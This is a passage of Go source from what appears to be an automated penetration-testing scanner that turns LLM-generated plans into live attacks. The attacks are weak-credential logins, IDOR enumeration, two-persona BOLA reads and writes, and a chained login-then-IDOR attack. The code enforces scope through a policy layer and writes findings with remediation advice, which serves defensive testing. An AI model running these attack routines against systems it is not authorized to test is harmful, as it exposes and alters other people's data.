package reasoner

import (
	"bytes"
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"net/url"
	"regexp"
	"strings"

	"github.com/ozzyw/aobtd/internal/policy"
	"github.com/ozzyw/aobtd/internal/store"
	"github.com/ozzyw/aobtd/internal/workflow"
	"github.com/ozzyw/aobtd/pkg/types"
)

// base64URL is the URL-safe, unpadded base64 encoder used by JWT segments.
var base64URL = base64.RawURLEncoding

// Executor runs a ProbePlan against a live target and returns the
// technique-appropriate outcome. Shared executor for all reasoners —
// technique primitives live here, not per-reasoner.
type Executor struct {
	client *http.Client
	db     *store.DB
	scanID int64
	logger *slog.Logger
}

// NewExecutor constructs a plan executor wired to the scan's DB and HTTP
// client. Findings produced by executed plans go into the scan's findings
// table via the normal InsertFinding pipeline.
func NewExecutor(client *http.Client, db *store.DB, scanID int64, logger *slog.Logger) *Executor {
	if logger == nil {
		logger = slog.Default()
	}
	return &Executor{client: client, db: db, scanID: scanID, logger: logger}
}

// NewPolicyExecutor is the production constructor. It preserves the supplied
// client's transport/timeouts while enforcing the scan's immutable authority,
// exact origin scope, redirect rules, and credential binding.
func NewPolicyExecutor(client *http.Client, db *store.DB, scanID int64, logger *slog.Logger,
	engine *policy.Engine, credentialOrigin string, audit policy.DecisionAudit,
) *Executor {
	protected := policy.ProtectHTTPClient(client, engine, policy.HTTPOptions{
		CredentialOrigin: credentialOrigin,
		Audit:            audit,
	})
	return NewExecutor(protected, db, scanID, logger)
}

// ExecutePlan runs a plan. Returns (confirmed, error) — confirmed==true
// means the plan's confirmation rule matched at least one payload.
//
// Dispatch:
//   - weak_credentials: POST each (user:pass) pair against plan.Target.URL,
//     confirm against plan.Confirmation.
//   - sqli_login_bypass: POST each SQL payload in place of the login's
//     identifier field.
//   - other techniques: not yet wired (logged as "unimplemented").
func (e *Executor) ExecutePlan(ctx context.Context, plan ProbePlan) (bool, error) {
	e.logger.Info("executing reasoner plan",
		"technique", plan.Technique,
		"target", plan.Target.URL,
		"source", plan.SourceReasoner,
		"payload_count", len(plan.Payloads),
		"confidence", plan.Confidence)

	// Narrate so the plan shows up in the UI timeline alongside other agents.
	narrMeta := map[string]any{
		"technique":  plan.Technique,
		"source":     plan.SourceReasoner,
		"rationale":  plan.Rationale,
		"confidence": plan.Confidence,
	}
	e.db.InsertNarration(e.scanID, "reasoner", "plan_dispatch",
		fmt.Sprintf("%s plan: %s on %s — %s",
			plan.SourceReasoner, plan.Technique, plan.Target.URL, plan.Rationale),
		plan.Target.URL, narrMeta)

	switch plan.Technique {
	case "weak_credentials":
		return e.execWeakCredentials(ctx, plan)
	case "sqli_login_bypass":
		return e.execSQLiLoginBypass(ctx, plan)
	case "sqli_generic":
		return e.execSQLiGeneric(ctx, plan)
	case "idor_sequential_id", "bola_tenant_crossing":
		// Same execution primitive — the reasoners frame the attack
		// differently (object enumeration vs tenant boundary) but the
		// HTTP behaviour is identical: mutate the identifier, confirm
		// via shape + baseline diff.
		return e.execIDORSequentialID(ctx, plan)
	case "bola_two_persona_ownership":
		return e.execBOLATwoPersonaOwnership(ctx, plan)
	case "bola_two_persona_mutation":
		return e.execBOLATwoPersonaMutation(ctx, plan)
	case "jwt_unsigned":
		return e.execJWTUnsigned(ctx, plan)
	case "jwt_weak_secret":
		return e.execJWTWeakSecret(ctx, plan)
	case "chain_attack_narrative":
		return e.execChainNarrative(ctx, plan)
	case "chain_auth_then_access":
		return e.execChainAuthThenAccess(ctx, plan)
	default:
		e.logger.Info("reasoner plan technique not yet implemented; logged only",
			"technique", plan.Technique)
		return false, nil
	}
}

// execIDORSequentialID probes an endpoint by substituting different object
// identifiers. Two modes depending on what the plan provides:
//
//  1. Path-mutation mode (plan.Target.Field == "path" or empty): replace
//     the trailing path segment with each payload. Used for URL-path IDs
//     like /api/users/{id}.
//  2. Query-mutation mode (plan.Target.Field is a query param name):
//     replace the param value with each payload.
//
// Confirmation: any payload response that satisfies the plan's rule
// AND differs materially from a baseline (response size > 50 bytes +
// at least one confirmation signal hits). The baseline-diff safety net
// prevents false positives when the server returns a uniform 404 page.
func (e *Executor) execIDORSequentialID(ctx context.Context, plan ProbePlan) (bool, error) {
	if len(plan.Payloads) == 0 {
		return false, nil
	}

	method := plan.Target.Method
	if method == "" {
		method = "GET"
	}

	// Build a baseline request with an unlikely-to-exist identifier,
	// used to distinguish "real record" responses from the
	// generic not-found or error case the server returns for missing IDs.
	baselineURL := buildIDORProbeURL(plan.Target.URL, plan.Target.Field, "AOBTDnope999999")
	baselineSize := 0
	baselineStatus := 0
	if req, err := http.NewRequestWithContext(ctx, method, baselineURL, nil); err == nil {
		req.Header.Set("User-Agent", "AOBTD/"+plan.SourceReasoner)
		e.applyProbeHeaders(req, plan.Target.Headers)
		if resp, err := e.client.Do(req); err == nil && resp != nil {
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
			resp.Body.Close()
			baselineSize = len(body)
			baselineStatus = resp.StatusCode
		}
	}

	for _, payload := range plan.Payloads {
		if ctx.Err() != nil {
			return false, ctx.Err()
		}
		u := buildIDORProbeURL(plan.Target.URL, plan.Target.Field, payload)
		req, err := http.NewRequestWithContext(ctx, method, u, nil)
		if err != nil {
			continue
		}
		req.Header.Set("User-Agent", "AOBTD/"+plan.SourceReasoner)
		e.applyProbeHeaders(req, plan.Target.Headers)
		resp, err := e.client.Do(req)
		if err != nil || resp == nil {
			continue
		}
		respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
		resp.Body.Close()

		// Must satisfy the confirmation rule…
		if !matchConfirmation(plan.Confirmation, resp, respBody) {
			continue
		}
		// …AND differ materially from the baseline (so we don't flag
		// every 404 page as an IDOR hit).
		if baselineSize > 0 && baselineStatus == resp.StatusCode &&
			approxSameSize(baselineSize, len(respBody)) {
			continue
		}

		e.emitFinding(plan, payload, resp.StatusCode, respBody,
			types.SeverityHigh, "idor",
			fmt.Sprintf("IDOR confirmed on %s with identifier %q [via %s]",
				plan.Target.URL, payload, plan.SourceReasoner),
			fmt.Sprintf("%s %s with identifier %q returned a response matching the "+
				"plan's confirmation rule (status=%d, size=%d, baseline-size=%d, "+
				"baseline-status=%d) and differed materially from the baseline. "+
				"Plan produced by %s with rationale: %s",
				method, u, payload, resp.StatusCode, len(respBody),
				baselineSize, baselineStatus, plan.SourceReasoner, plan.Rationale))
		return true, nil
	}
	return false, nil
}

// buildIDORProbeURL mutates a target URL with the given identifier value.
// Field semantics:
//   - "" or "path" → replace the trailing path segment
//   - anything else → replace the named query parameter
func buildIDORProbeURL(rawURL, field, value string) string {
	if field == "" || field == "path" {
		return replacePathTail(rawURL, value)
	}
	return rewriteQueryParam(rawURL, field, value)
}

// replacePathTail swaps the final `/segment` of a URL's path with /value.
// Preserves host, scheme, query. Used when the IDOR identifier lives in
// the URL path rather than a query parameter.
func replacePathTail(rawURL, value string) string {
	u, err := url.Parse(rawURL)
	if err != nil {
		return rawURL
	}
	escapedValue := escapePathSegmentPayload(value)
	escapedPath := u.EscapedPath()
	if escapedPath == "" {
		escapedPath = "/"
	}
	if i := strings.LastIndex(escapedPath, "/"); i >= 0 && i < len(escapedPath)-1 {
		escapedPath = escapedPath[:i+1] + escapedValue
	} else if i == len(escapedPath)-1 {
		// Trailing slash — append value.
		escapedPath += escapedValue
	} else {
		escapedPath = "/" + escapedValue
	}
	if decodedPath, err := url.PathUnescape(escapedPath); err == nil {
		u.Path = decodedPath
		u.RawPath = escapedPath
	} else {
		u.Path = escapedPath
		u.RawPath = ""
	}
	return u.String()
}

// escapePathSegmentPayload normalizes a caller-supplied path payload before
// encoding it as one URL segment. Some upstream reasoners and probe templates
// already carry encoded payloads such as "%3Cscript%3E"; blindly PathEscape'ing
// those turns them into "%253Cscript%253E", which tests the wrong value. Decode
// once when possible, then re-escape exactly once.
func escapePathSegmentPayload(value string) string {
	if strings.Contains(value, "%") {
		if decoded, err := url.PathUnescape(value); err == nil && decoded != "" {
			value = decoded
		}
	}
	return url.PathEscape(value)
}

// approxSameSize reports whether two response sizes are close enough that
// the responses are probably identical content (differences of a few
// bytes for dynamic timestamps etc. are tolerated).
func approxSameSize(a, b int) bool {
	diff := a - b
	if diff < 0 {
		diff = -diff
	}
	if a == 0 {
		return b == 0
	}
	// Within 10% or 32 bytes, whichever is larger.
	tol := 32
	if t := a / 10; t > tol {
		tol = t
	}
	return diff <= tol
}

// execChainAuthThenAccess runs a real end-to-end attack chain:
//
//	step 1: submit weak credentials to plan.Target.URL → capture session token
//	step 2: replay the token as Authorization against each access URL in
//	        plan.Target.Headers["chain_access_urls"] (comma-separated) with
//	        path-tail identifiers from plan.Payloads
//
// Confirmation: step 1 must return a token-like body; step 2 must return
// different responses for different identifiers (proves IDOR with auth).
//
// Plan shape emitted by ChainReasoner:
//
//	plan.Technique            = "chain_auth_then_access"
//	plan.Target.URL           = login endpoint URL
//	plan.Target.BodyType      = "json" or "form"
//	plan.Target.Headers       = {"chain_access_urls": "http://target/api/Users,http://target/api/Orders",
//	                             "chain_auth_user": "demo", "chain_auth_pass": "demo"}
//	plan.Payloads             = access identifiers to try (["1","2","3"])
//	plan.Confirmation         = rule for the access-step response
//
// This is "real" attack automation: the LLM-emitted plan turns into a
// logged-in + IDOR-attempted HTTP sequence. Safety comes from the same
// validation as other techniques (Target.URL in evidence) plus the
// specific credential being in plan.Target.Headers (reasoner must
// reference a previously-confirmed weak_credentials finding).
func (e *Executor) execChainAuthThenAccess(ctx context.Context, plan ProbePlan) (bool, error) {
	user := plan.Target.Headers["chain_auth_user"]
	pass := plan.Target.Headers["chain_auth_pass"]
	accessCSV := plan.Target.Headers["chain_access_urls"]
	if user == "" || pass == "" || accessCSV == "" || len(plan.Payloads) == 0 {
		e.logger.Info("chain_auth_then_access: plan missing required headers / payloads",
			"url", plan.Target.URL)
		return false, nil
	}

	// ── Step 1: login ───────────────────────────────────────────────
	loginBody := fmt.Sprintf(`{"email":%q,"password":%q}`, user, pass)
	if plan.Target.BodyType == "form" {
		loginBody = fmt.Sprintf("email=%s&password=%s",
			url.QueryEscape(user), url.QueryEscape(pass))
	}
	req, err := http.NewRequestWithContext(ctx, "POST", plan.Target.URL,
		strings.NewReader(loginBody))
	if err != nil {
		return false, nil
	}
	if plan.Target.BodyType == "form" {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	} else {
		req.Header.Set("Content-Type", "application/json")
	}
	req.Header.Set("User-Agent", "AOBTD/"+plan.SourceReasoner+" (chain step 1)")

	resp, err := e.client.Do(req)
	if err != nil || resp == nil {
		return false, nil
	}
	loginRespBody, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
	resp.Body.Close()
	if resp.StatusCode != 200 {
		// Login didn't succeed — chain can't proceed.
		return false, nil
	}

	token := extractBearerToken(string(loginRespBody))
	if token == "" {
		return false, nil
	}

	// ── Step 2: IDOR with session ───────────────────────────────────
	// Try each access URL × each payload. Confirm if a payload's response
	// materially differs from another payload's (indicating different
	// records returned for different identifiers with the same auth).
	accessURLs := splitAndTrim(accessCSV, ",")
	for _, accessURL := range accessURLs {
		if ctx.Err() != nil {
			return false, ctx.Err()
		}
		// Collect response signatures for comparison.
		type resp2 struct {
			payload string
			status  int
			size    int
			body    []byte
		}
		var responses []resp2
		for _, payload := range plan.Payloads {
			u := replacePathTail(accessURL, payload)
			r2, err := http.NewRequestWithContext(ctx, "GET", u, nil)
			if err != nil {
				continue
			}
			r2.Header.Set("Authorization", "Bearer "+token)
			r2.Header.Set("User-Agent", "AOBTD/"+plan.SourceReasoner+" (chain step 2)")
			rr, err := e.client.Do(r2)
			if err != nil || rr == nil {
				continue
			}
			rb, _ := io.ReadAll(io.LimitReader(rr.Body, 256*1024))
			rr.Body.Close()
			responses = append(responses, resp2{
				payload: payload, status: rr.StatusCode, size: len(rb), body: rb,
			})
		}
		// Need ≥2 responses to compare.
		if len(responses) < 2 {
			continue
		}
		// IDOR confirmed if ≥2 responses differ in size or content
		// significantly AND at least one matches the plan's confirmation rule.
		for i := 0; i < len(responses); i++ {
			for j := i + 1; j < len(responses); j++ {
				a, b := responses[i], responses[j]
				if approxSameSize(a.size, b.size) {
					continue
				}
				// Pick the larger response — that's the "leaks data" one.
				winner := a
				if b.size > a.size {
					winner = b
				}
				// Build a fake http.Response for matchConfirmation.
				fakeResp := &http.Response{
					StatusCode: winner.status,
					Header:     make(http.Header),
				}
				if !matchConfirmation(plan.Confirmation, fakeResp, winner.body) {
					continue
				}
				// Confirmed: two different identifiers returned different
				// authenticated responses, one matching the confirmation rule.
				e.emitFinding(plan, winner.payload, winner.status, winner.body,
					types.SeverityCritical, "chain_auth_then_access",
					fmt.Sprintf(
						"Chain confirmed: login(%s:%s) → IDOR on %s via identifier %q [via %s]",
						user, pass, accessURL, winner.payload, plan.SourceReasoner),
					fmt.Sprintf(
						"End-to-end attack chain executed successfully:\n"+
							"  Step 1: POST %s with (%s,%s) returned HTTP 200 with a session token.\n"+
							"  Step 2: authenticated GET %s/%s (size=%d) vs authenticated GET %s/%s (size=%d)\n"+
							"          Different-sized responses indicate per-identifier access\n"+
							"          (classic IDOR with a valid session).\n"+
							"Rationale: %s\n\nThis is not a single-step finding — it proves the\n"+
							"FULL attack path works: credential weakness → authenticated access to\n"+
							"other users' data. Severity is critical because the chain is automatic.",
						plan.Target.URL, user, pass,
						accessURL, a.payload, a.size,
						accessURL, b.payload, b.size, plan.Rationale))
				return true, nil
			}
		}
	}
	return false, nil
}

// execBOLATwoPersonaOwnership confirms Broken Object Level Authorization with
// the same controls a human tester would run early in an engagement:
//
//  1. log in as persona A and persona B
//  2. B reads B's object (positive control)
//  3. A reads A's object (positive control)
//  4. anonymous reads B's object (auth-boundary control)
//  5. A reads B's object (attack experiment)
//
// The finding is only confirmed when the attack response is accessible to A
// AND still carries B's owner marker. This avoids the classic false positive
// where an ID mutation returns a generic success page or A's own object.
//
// Plan shape:
//
//	plan.Technique       = "bola_two_persona_ownership"
//	plan.Target.URL      = login endpoint URL, unless
//	                       headers["bola_login_url"] overrides it
//	plan.Target.BodyType = "json" or "form"
//	plan.Target.Headers  = {
//	  "bola_user_a": "...", "bola_pass_a": "...", "bola_owner_a": "...",
//	  "bola_object_a_url": "https://target/api/orders/1",
//	  "bola_user_b": "...", "bola_pass_b": "...", "bola_owner_b": "...",
//	  "bola_object_b_url": "https://target/api/orders/2"
//	}
func (e *Executor) execBOLATwoPersonaOwnership(ctx context.Context, plan ProbePlan) (bool, error) {
	h := plan.Target.Headers
	loginURL := strings.TrimSpace(h["bola_login_url"])
	if loginURL == "" {
		loginURL = plan.Target.URL
	}
	userA, passA := strings.TrimSpace(h["bola_user_a"]), h["bola_pass_a"]
	userB, passB := strings.TrimSpace(h["bola_user_b"]), h["bola_pass_b"]
	ownerA, ownerB := strings.TrimSpace(h["bola_owner_a"]), strings.TrimSpace(h["bola_owner_b"])
	objectAURL := strings.TrimSpace(h["bola_object_a_url"])
	objectBURL := strings.TrimSpace(h["bola_object_b_url"])
	if loginURL == "" || userA == "" || passA == "" || ownerA == "" || objectAURL == "" ||
		userB == "" || passB == "" || ownerB == "" || objectBURL == "" {
		e.logger.Info("bola_two_persona_ownership: plan missing required persona/object headers",
			"url", plan.Target.URL)
		return false, nil
	}
	if ownerA == ownerB {
		e.logger.Info("bola_two_persona_ownership: owner markers are identical; cannot prove cross-owner access",
			"url", objectBURL)
		return false, nil
	}

	authHeader := strings.TrimSpace(h["bola_auth_header"])
	if authHeader == "" {
		authHeader = "Authorization"
	}
	authScheme := strings.TrimSpace(h["bola_auth_scheme"])
	if authScheme == "" {
		authScheme = "Bearer"
	}

	workflowPlan := workflow.OwnershipReadPlan("reasoner-bola-two-persona",
		workflow.Actor{
			Label:       "persona-a",
			Role:        workflow.ActorPrimary,
			LoginURL:    loginURL,
			Username:    userA,
			Secret:      passA,
			OwnerMarker: ownerA,
		},
		workflow.Actor{
			Label:       "persona-b",
			Role:        workflow.ActorSecondary,
			LoginURL:    loginURL,
			Username:    userB,
			Secret:      passB,
			OwnerMarker: ownerB,
		},
		workflow.ResourceRef{Type: "object", URL: objectAURL, Method: "GET", OwnerMarker: ownerA},
		workflow.ResourceRef{Type: "object", URL: objectBURL, Method: "GET", OwnerMarker: ownerB},
	)
	usernameField := strings.TrimSpace(h["bola_username_field"])
	if usernameField == "" {
		usernameField = "email"
	}
	passwordField := strings.TrimSpace(h["bola_password_field"])
	if passwordField == "" {
		passwordField = "password"
	}
	result, err := workflow.NewRunner(e.client).RunOwnershipRead(ctx, workflowPlan, workflow.AuthConfig{
		BodyType:      plan.Target.BodyType,
		UsernameField: usernameField,
		PasswordField: passwordField,
		AuthHeader:    authHeader,
		AuthScheme:    authScheme,
		UserAgent:     "AOBTD/" + plan.SourceReasoner + " (ownership workflow)",
	})
	if err != nil {
		if ctx.Err() != nil {
			return false, ctx.Err()
		}
		e.logger.Info("bola_two_persona_ownership: workflow execution failed",
			"url", objectBURL, "error", err)
		return false, nil
	}
	if !result.Confirmed {
		e.logger.Info("bola_two_persona_ownership: controls did not prove BOLA",
			"login_a_status", result.LoginPrimaryStatus,
			"login_b_status", result.LoginSecondaryStatus,
			"self_b_status", result.SelfSecondary.Status,
			"self_b_owner_ok", result.SelfSecondary.OwnerProofVisible,
			"self_a_status", result.SelfPrimary.Status,
			"self_a_owner_ok", result.SelfPrimary.OwnerProofVisible,
			"anonymous_b_status", result.Anonymous.Status,
			"anonymous_b_owner_ok", result.Anonymous.OwnerProofVisible,
			"attack_status", result.Attack.Status,
			"attack_owner_ok", result.Attack.OwnerProofVisible,
			"reason", result.Reason)
		return false, nil
	}

	endpointID := "GET " + objectBURL
	title := fmt.Sprintf("BOLA confirmed: persona A can read persona B's object at %s [via %s]",
		objectBURL, plan.SourceReasoner)
	description := fmt.Sprintf(
		"Two-persona ownership proof succeeded. Persona B could read the B-owned object, persona A could read the A-owned object, anonymous access to B's object was blocked or did not expose B ownership, and then persona A could read B's object while the response still carried B's owner marker. Plan rationale: %s",
		plan.Rationale)
	evidence := fmt.Sprintf(
		"Two-persona BOLA confirmation\n"+
			"- Login A (%s): HTTP %d, token captured.\n"+
			"- Login B (%s): HTTP %d, token captured.\n"+
			"- Positive control B→B: GET %s returned HTTP %d with owner proof %q.\n"+
			"- Positive control A→A: GET %s returned HTTP %d with owner proof %q.\n"+
			"- Anonymous control → B: GET %s returned HTTP %d; owner proof visible=%v (%q).\n"+
			"- Attack A→B: GET %s returned HTTP %d and still proved B ownership via %q.\n"+
			"Reasoner: %s\nRationale: %s",
		userA, result.LoginPrimaryStatus,
		userB, result.LoginSecondaryStatus,
		objectBURL, result.SelfSecondary.Status, result.SelfSecondary.OwnerProofEvidence,
		objectAURL, result.SelfPrimary.Status, result.SelfPrimary.OwnerProofEvidence,
		objectBURL, result.Anonymous.Status, result.Anonymous.OwnerProofVisible, result.Anonymous.OwnerProofEvidence,
		objectBURL, result.Attack.Status, result.Attack.OwnerProofEvidence,
		plan.SourceReasoner, plan.Rationale)

	f := types.Finding{
		Title:       title,
		Description: description,
		Severity:    types.SeverityHigh,
		Confidence:  types.ConfidenceConfirmed,
		EndpointID:  endpointID,
		VulnType:    "bola",
		Payload:     fmt.Sprintf("persona A (%s) reads persona B object %s", userA, objectBURL),
		PocRequest: fmt.Sprintf(
			"GET %s HTTP/1.1\n%s: %s <persona-a-token>\n\n",
			objectBURL, authHeader, authScheme),
		PocResponse: fmt.Sprintf("HTTP/1.1 %d\n\n%s",
			result.Attack.Status, truncate(string(result.Attack.Body), 600)),
		Evidence: evidence,
		StepsToReproduce: fmt.Sprintf(
			"1. Log in as persona B (%s) and confirm GET %s returns B-owned data.\n"+
				"2. Log in as persona A (%s) and confirm GET %s returns A-owned data.\n"+
				"3. Request %s without credentials and confirm the object is not anonymously exposed.\n"+
				"4. Reuse persona A's token to request %s.\n"+
				"5. Observe HTTP %d with B's owner marker %q in the response.",
			userB, objectBURL,
			userA, objectAURL,
			objectBURL,
			objectBURL,
			result.Attack.Status, result.Attack.OwnerProofEvidence),
		Impact:      "Any authenticated user can access another user's object by requesting its identifier. This can expose private account data and enables account-to-account data theft.",
		Remediation: "Authorize every object read/write server-side by comparing the authenticated subject to the object's owner or tenant before returning the object. Do not rely on client-side route guards or hidden UI links.",
	}
	if !e.db.FindingExists(e.scanID, title, endpointID) {
		e.db.InsertFinding(e.scanID, f)
	}
	e.db.InsertNarration(e.scanID, "reasoner", "bola_two_persona_confirmed",
		fmt.Sprintf("%s confirmed BOLA with two personas: A could read B-owned object %s",
			plan.SourceReasoner, objectBURL),
		objectBURL, map[string]any{
			"persona_a":          userA,
			"persona_b":          userB,
			"owner_a":            ownerA,
			"owner_b":            ownerB,
			"anonymous_status":   result.Anonymous.Status,
			"attack_status":      result.Attack.Status,
			"attack_owner_proof": result.Attack.OwnerProofEvidence,
		})
	return true, nil
}

// execBOLATwoPersonaMutation confirms cross-owner state mutation with the same
// control philosophy as the readback workflow, but bounded to one harmless
// field/value supplied by the plan. The policy-wrapped HTTP client remains the
// authority gate for whether POST/PUT/PATCH is permitted for this scan.
func (e *Executor) execBOLATwoPersonaMutation(ctx context.Context, plan ProbePlan) (bool, error) {
	h := plan.Target.Headers
	loginURL := strings.TrimSpace(h["bola_login_url"])
	if loginURL == "" {
		loginURL = plan.Target.URL
	}
	userA, passA := strings.TrimSpace(h["bola_user_a"]), h["bola_pass_a"]
	userB, passB := strings.TrimSpace(h["bola_user_b"]), h["bola_pass_b"]
	ownerA, ownerB := strings.TrimSpace(h["bola_owner_a"]), strings.TrimSpace(h["bola_owner_b"])
	objectAURL := strings.TrimSpace(h["bola_object_a_url"])
	objectBURL := strings.TrimSpace(h["bola_object_b_url"])
	mutationURL := strings.TrimSpace(h["bola_mutation_url"])
	mutationMethod := strings.ToUpper(strings.TrimSpace(h["bola_mutation_method"]))
	mutationField := strings.TrimSpace(h["bola_mutation_field"])
	mutationValue := strings.TrimSpace(h["bola_mutation_value"])
	if mutationMethod == "" {
		mutationMethod = "PATCH"
	}
	if loginURL == "" || userA == "" || passA == "" || ownerA == "" || objectAURL == "" ||
		userB == "" || passB == "" || ownerB == "" || objectBURL == "" ||
		mutationURL == "" || mutationField == "" || mutationValue == "" {
		e.logger.Info("bola_two_persona_mutation: plan missing required persona/object/mutation headers",
			"url", plan.Target.URL)
		return false, nil
	}
	if ownerA == ownerB {
		e.logger.Info("bola_two_persona_mutation: owner markers are identical; cannot prove cross-owner mutation",
			"url", mutationURL)
		return false, nil
	}

	authHeader := strings.TrimSpace(h["bola_auth_header"])
	if authHeader == "" {
		authHeader = "Authorization"
	}
	authScheme := strings.TrimSpace(h["bola_auth_scheme"])
	if authScheme == "" {
		authScheme = "Bearer"
	}
	usernameField := strings.TrimSpace(h["bola_username_field"])
	if usernameField == "" {
		usernameField = "email"
	}
	passwordField := strings.TrimSpace(h["bola_password_field"])
	if passwordField == "" {
		passwordField = "password"
	}
	mutationBodyType := strings.TrimSpace(h["bola_mutation_body_type"])

	workflowPlan := workflow.OwnershipMutationPlan("reasoner-bola-two-persona-mutation",
		workflow.Actor{
			Label:       "persona-a",
			Role:        workflow.ActorPrimary,
			LoginURL:    loginURL,
			Username:    userA,
			Secret:      passA,
			OwnerMarker: ownerA,
		},
		workflow.Actor{
			Label:       "persona-b",
			Role:        workflow.ActorSecondary,
			LoginURL:    loginURL,
			Username:    userB,
			Secret:      passB,
			OwnerMarker: ownerB,
		},
		workflow.ResourceRef{Type: "object", URL: objectAURL, Method: "GET", OwnerMarker: ownerA},
		workflow.ResourceRef{Type: "object", URL: objectBURL, Method: "GET", OwnerMarker: ownerB},
		workflow.Step{
			Actor:  "persona-a",
			Action: workflow.StepMutateBody,
			Method: mutationMethod,
			URL:    mutationURL,
			Field:  mutationField,
			Value:  mutationValue,
		},
	)
	result, err := workflow.NewRunner(e.client).RunOwnershipMutation(ctx, workflowPlan, workflow.AuthConfig{
		BodyType:         plan.Target.BodyType,
		MutationBodyType: mutationBodyType,
		UsernameField:    usernameField,
		PasswordField:    passwordField,
		AuthHeader:       authHeader,
		AuthScheme:       authScheme,
		UserAgent:        "AOBTD/" + plan.SourceReasoner + " (ownership mutation workflow)",
	})
	if err != nil {
		if ctx.Err() != nil {
			return false, ctx.Err()
		}
		e.logger.Info("bola_two_persona_mutation: workflow execution failed",
			"url", mutationURL, "error", err)
		return false, nil
	}
	if !result.Confirmed {
		e.logger.Info("bola_two_persona_mutation: controls did not prove cross-owner mutation",
			"login_a_status", result.LoginPrimaryStatus,
			"login_b_status", result.LoginSecondaryStatus,
			"before_b_status", result.BeforeSecondary.Status,
			"before_b_owner_ok", result.BeforeSecondary.OwnerProofVisible,
			"attack_status", result.Attack.Status,
			"attack_owner_ok", result.Attack.OwnerProofVisible,
			"after_b_status", result.AfterSecondary.Status,
			"after_b_owner_ok", result.AfterSecondary.OwnerProofVisible,
			"reason", result.Reason)
		return false, nil
	}

	endpointID := mutationMethod + " " + mutationURL
	title := fmt.Sprintf("BOLA mutation confirmed: persona A can change persona B's object at %s [via %s]",
		mutationURL, plan.SourceReasoner)
	description := fmt.Sprintf(
		"Two-persona ownership mutation proof succeeded. Persona B could read the B-owned object, persona A changed field %q on that B-owned object, and the changed value remained associated with B ownership. Plan rationale: %s",
		mutationField, plan.Rationale)
	evidence := fmt.Sprintf(
		"Two-persona BOLA mutation confirmation\n"+
			"- Login A (%s): HTTP %d, token captured.\n"+
			"- Login B (%s): HTTP %d, token captured.\n"+
			"- Positive control B→B before mutation: GET %s returned HTTP %d with owner proof %q.\n"+
			"- Attack A→B mutation: %s %s with %s=%q returned HTTP %d; owner proof visible=%v (%q).\n"+
			"- Verification B→B after mutation: GET %s returned HTTP %d with owner proof %q and value %q.\n"+
			"Reasoner: %s\nRationale: %s",
		userA, result.LoginPrimaryStatus,
		userB, result.LoginSecondaryStatus,
		objectBURL, result.BeforeSecondary.Status, result.BeforeSecondary.OwnerProofEvidence,
		mutationMethod, mutationURL, mutationField, mutationValue, result.Attack.Status, result.Attack.OwnerProofVisible, result.Attack.OwnerProofEvidence,
		objectBURL, result.AfterSecondary.Status, result.AfterSecondary.OwnerProofEvidence, mutationValue,
		plan.SourceReasoner, plan.Rationale)

	f := types.Finding{
		Title:       title,
		Description: description,
		Severity:    types.SeverityHigh,
		Confidence:  types.ConfidenceConfirmed,
		EndpointID:  endpointID,
		VulnType:    "bola",
		Payload:     fmt.Sprintf("persona A (%s) mutates persona B object %s field %s", userA, mutationURL, mutationField),
		PocRequest: fmt.Sprintf(
			"%s %s HTTP/1.1\n%s: %s <persona-a-token>\nContent-Type: application/json\n\n{%q:%q}\n",
			mutationMethod, mutationURL, authHeader, authScheme, mutationField, mutationValue),
		PocResponse: fmt.Sprintf("HTTP/1.1 %d\n\n%s",
			result.Attack.Status, truncate(string(result.Attack.Body), 600)),
		Evidence: evidence,
		StepsToReproduce: fmt.Sprintf(
			"1. Log in as persona B (%s) and confirm GET %s returns B-owned data.\n"+
				"2. Log in as persona A (%s).\n"+
				"3. Reuse persona A's token to send %s %s with field %q set to %q.\n"+
				"4. Log back in or request as persona B and fetch %s.\n"+
				"5. Observe B's object still proves B ownership but now contains the value %q.",
			userB, objectBURL,
			userA,
			mutationMethod, mutationURL, mutationField, mutationValue,
			objectBURL,
			mutationValue),
		Impact:      "Any authenticated user can modify another user's object by targeting its identifier. This can corrupt account data, alter business records, or abuse workflows across tenants/users.",
		Remediation: "Authorize every object mutation server-side by comparing the authenticated subject to the object's owner or tenant before applying state changes. Treat client-provided object IDs and ownership fields as untrusted.",
	}
	if !e.db.FindingExists(e.scanID, title, endpointID) {
		e.db.InsertFinding(e.scanID, f)
	}
	e.db.InsertNarration(e.scanID, "reasoner", "bola_two_persona_mutation_confirmed",
		fmt.Sprintf("%s confirmed cross-owner mutation: A changed B-owned object %s",
			plan.SourceReasoner, mutationURL),
		mutationURL, map[string]any{
			"persona_a":       userA,
			"persona_b":       userB,
			"owner_a":         ownerA,
			"owner_b":         ownerB,
			"mutation_method": mutationMethod,
			"mutation_field":  mutationField,
			"attack_status":   result.Attack.Status,
			"after_status":    result.AfterSecondary.Status,
		})
	return true, nil
}

type bolaObjectResponse struct {
	status int
	body   []byte
}

func (e *Executor) loginForBearerToken(ctx context.Context, loginURL, bodyType, user, pass, userAgent string) (string, int, []byte, error) {
	loginBody := fmt.Sprintf(`{"email":%q,"password":%q}`, user, pass)
	if bodyType == "form" {
		loginBody = fmt.Sprintf("email=%s&password=%s",
			url.QueryEscape(user), url.QueryEscape(pass))
	}
	req, err := http.NewRequestWithContext(ctx, "POST", loginURL, strings.NewReader(loginBody))
	if err != nil {
		return "", 0, nil, err
	}
	if bodyType == "form" {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	} else {
		req.Header.Set("Content-Type", "application/json")
	}
	req.Header.Set("User-Agent", "AOBTD/"+userAgent)

	resp, err := e.client.Do(req)
	if err != nil || resp == nil {
		return "", 0, nil, err
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
	resp.Body.Close()
	return extractBearerToken(string(body)), resp.StatusCode, body, nil
}

func (e *Executor) getBOLAObject(ctx context.Context, objectURL, authHeader, authScheme, token, userAgent string) (bolaObjectResponse, error) {
	req, err := http.NewRequestWithContext(ctx, "GET", objectURL, nil)
	if err != nil {
		return bolaObjectResponse{}, err
	}
	req.Header.Set("User-Agent", "AOBTD/"+userAgent)
	if token != "" && authHeader != "" {
		if strings.EqualFold(authScheme, "raw") || authScheme == "" {
			req.Header.Set(authHeader, token)
		} else {
			req.Header.Set(authHeader, authScheme+" "+token)
		}
	}
	resp, err := e.client.Do(req)
